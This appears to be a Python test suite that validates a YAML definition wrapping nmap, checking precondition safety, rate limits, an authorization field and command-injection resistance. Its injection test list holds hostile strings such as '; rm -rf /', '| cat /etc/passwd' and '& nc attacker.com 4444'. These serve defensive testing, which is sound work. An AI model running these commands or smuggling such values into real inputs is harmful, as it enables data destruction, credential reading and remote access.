#!/usr/bin/env python3
"""Gate 2: Precondition and Safety Contract — Test Suite

Tests that preconditions are side-effect-free, safety parameters work,
and no parameter combination allows command injection.

Run with: python3 gate2-tests.py
"""

import re
import sys
import yaml
import subprocess
import shlex

ATOM_PATH = "/home/mark/Desktop/hybrid_scratchpad/atoms/nmap.yaml"

with open(ATOM_PATH) as f:
    atom = yaml.safe_load(f)

params = {p["name"]: p for p in atom["parameters"]}
errors = []
passed = 0

def check(name, condition, detail=""):
    global passed
    if condition:
        passed += 1
        print(f"  PASS: {name}")
    else:
        errors.append((name, detail))
        print(f"  FAIL: {name} — {detail}")

# ── GATE 2 CHECK 1: Preconditions are side-effect-free ──────────────

print("\n=== CHECK 1: Preconditions Are Side-Effect-Free ===")

preconditions = atom.get("preconditions", [])

for i, pc in enumerate(preconditions):
    # Check for network emission commands
    has_network_emission = False
    network_keywords = ["nmap ", "ping ", "arp ", "arping", "fping", "hping", "scapy"]
    for kw in network_keywords:
        if kw in pc:
            has_network_emission = True
            break

    # Check for sudo usage
    has_sudo = "sudo " in pc or pc.strip().startswith("sudo")

    # Check for actual command execution (not just test/which/version)
    is_pure_check = (
        pc.strip().startswith("test ")
        or pc.strip().startswith("command -v ")
        or pc.strip().startswith("nmap --version")
        or pc.strip().startswith("python3 -c 'import ")
        or pc.strip().startswith("mkdir -p ")
    )
    # "nmap " is NOT a network emission if it's just --version, --help, or command -v
    # Only actual nmap scans (with targets/flags) are network emissions
    is_path_check = pc.strip().startswith("command -v ")
    is_version_check = "--version" in pc or "--help" in pc
    has_network_emission = (
        "nmap " in pc
        and not is_path_check
        and not is_version_check
    )

    if has_network_emission:
        check(f"Precondition {i+1} has NO network emission", False,
              f"'{pc}' contains network command")
    else:
        check(f"Precondition {i+1} has NO network emission", True)

    if has_sudo:
        check(f"Precondition {i+1} has NO sudo", False,
              f"'{pc}' uses sudo")
    else:
        check(f"Precondition {i+1} has NO sudo", True)

# ── GATE 2 CHECK 2: Pure preconditions actually work ────────────────

print("\n=== CHECK 2: Pure Preconditions Actually Work ===")

# Test each precondition individually
for i, pc in enumerate(preconditions):
    # Skip mkdir -p (it's a setup, not a check)
    if "mkdir -p" in pc:
        check(f"Precondition {i+1} (setup): {pc[:40]}...",
              True, "(expected to create directory)")
        continue

    # For nmap --version check
    if "nmap --version" in pc:
        try:
            result = subprocess.run(
                ["nmap", "--version"],
                capture_output=True, text=True, timeout=10
            )
            check(f"Precondition {i+1}: nmap --version works",
                  result.returncode == 0 and len(result.stdout) > 0,
                  f"Exit code: {result.returncode}")
        except subprocess.TimeoutExpired:
            check(f"Precondition {i+1}: nmap --version works", False,
                  "Timeout")
        except FileNotFoundError:
            check(f"Precondition {i+1}: nmap --version works", False,
                  "nmap not found")
        continue

    # For python3 import checks
    if "python3 -c 'import " in pc:
        try:
            # Extract the import statement from the python3 -c command
            import_part = pc.split("python3 -c ")[1].split("'")[1] if "'" in pc else ""
            cmd = f"python3 -c '{import_part}' 2>&1"
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=5
            )
            check(f"Precondition {i+1}: python3 import works",
                  result.returncode == 0,
                  f"Exit code: {result.returncode}, stderr: {result.stderr.strip()[:100]}")
        except Exception as e:
            check(f"Precondition {i+1}: python3 import works", False, str(e))
        continue

    # For test/command checks
    try:
        result = subprocess.run(
            pc, shell=True, capture_output=True, text=True, timeout=10
        )
        check(f"Precondition {i+1}: '{pc[:50]}...' returns 0",
              result.returncode == 0,
              f"Exit code: {result.returncode}")
    except subprocess.TimeoutExpired:
        check(f"Precondition {i+1}: '{pc[:50]}...' returns 0", False, "Timeout")
    except Exception as e:
        check(f"Precondition {i+1}: '{pc[:50]}...' returns 0", False, str(e))

# ── GATE 2 CHECK 3: Safety parameters present ───────────────────────

print("\n=== CHECK 3: Safety Parameters Present ===")
safety_params = ["max_rate", "min_rate", "max_hosts"]
for sp in safety_params:
    if sp in params:
        check(f"Safety parameter '{sp}' exists", True)
        pdef = params[sp]
        has_min = "minimum" in pdef
        has_max = "maximum" in pdef
        check(f"Safety parameter '{sp}' has min/max constraints",
              has_min and has_max,
              f"min={pdef.get('minimum')}, max={pdef.get('maximum')}")
    else:
        check(f"Safety parameter '{sp}' exists", False, "Missing from atom")

# ── GATE 2 CHECK 4: Authorization field ─────────────────────────────

print("\n=== CHECK 4: Authorization Field ===")
reason_param = params.get("reason", {})
if "reason" in params:
    check("Authorization/Reason field exists", True)
    check("Reason field is documented as safety requirement",
          "safety" in reason_param.get("description", "").lower() or
          "reason" in reason_param.get("description", "").lower(),
          f"Description: {reason_param.get('description', '')}")
else:
    check("Authorization/Reason field exists", False, "Missing from atom")

# ── GATE 2 CHECK 5: Command injection prevention ────────────────────

print("\n=== CHECK 5: Command Injection Prevention ===")

# Test each parameter for injection vectors
injection_chars = [';', '|', '&', '`', '$(', ')', '\n', '\r']
injection_targets = [
    "; rm -rf /",
    "$(whoami)",
    "| cat /etc/passwd",
    "& nc attacker.com 4444",
    "`id`",
]

safe_params = ["target", "ports", "script", "output_file", "exclude_file", "dns_servers"]

for pname in safe_params:
    pdef = params.get(pname, {})
    has_regex = "validation_regex" in pdef
    if has_regex:
        regex = pdef["validation_regex"]
        for inj in injection_targets:
            match = re.match(regex, inj)
            check(f"Param '{pname}' rejects injection '{inj[:20]}...' via regex",
                  match is None,
                  f"Regex: {regex}")
    else:
        check(f"Param '{pname}' has validation_regex", False,
              "Missing — injection possible")

# ── GATE 2 CHECK 6: Blast radius controls in examples ───────────────

print("\n=== CHECK 6: Blast Radius Controls in Examples ===")
examples = atom.get("example_invocations", [])
for ex in examples:
    inp = ex.get("input", {})
    has_max_rate = "max_rate" in inp and inp["max_rate"] > 0
    has_reason = "reason" in inp and len(inp["reason"]) > 0
    if has_max_rate and has_reason:
        check(f"Example '{ex['name']}' has blast radius controls", True)
    else:
        if not has_max_rate:
            check(f"Example '{ex['name']}' has max_rate", False,
                  "Not set — blast radius uncontrolled")
        if not has_reason:
            check(f"Example '{ex['name']}' has reason", False,
                  "Not set — safety audit trail missing")

# ── GATE 2 CHECK 7: Privilege model documented ──────────────────────

print("\n=== CHECK 7: Privilege Model Documented ===")
import os
priv_model_path = "/home/mark/Desktop/hybrid_scratchpad/atoms/_reference/privilege-model.md"
if os.path.exists(priv_model_path):
    with open(priv_model_path) as f:
        content = f.read()
    check("Privilege model document exists", True)
    check("Privilege model covers all scan types",
          all(st in content for st in ["host-discovery", "syn-scan", "udp-scan", "os-detect", "version-detect", "script-scan"]),
          "Missing coverage for some scan types")
    check("Privilege model specifies conditional sudo",
          "conditional" in content.lower() or "IF" in content,
          "No conditional sudo logic documented")
else:
    check("Privilege model document exists", False, "File not found")

# ── SUMMARY ─────────────────────────────────────────────────────────

total = passed + len(errors)
print(f"\n{'='*60}")
print(f"Gate 2 Results: {passed}/{total} checks passed")
if errors:
    print(f"\n{len(errors)} FAILURES:")
    for name, detail in errors:
        print(f"  ✗ {name}: {detail}")
    print("\nGATE 2: FAILED — fix all failures before proceeding")
else:
    print("\nGATE 2: PASSED — proceed to Gate 3")

sys.exit(1 if errors else 0)
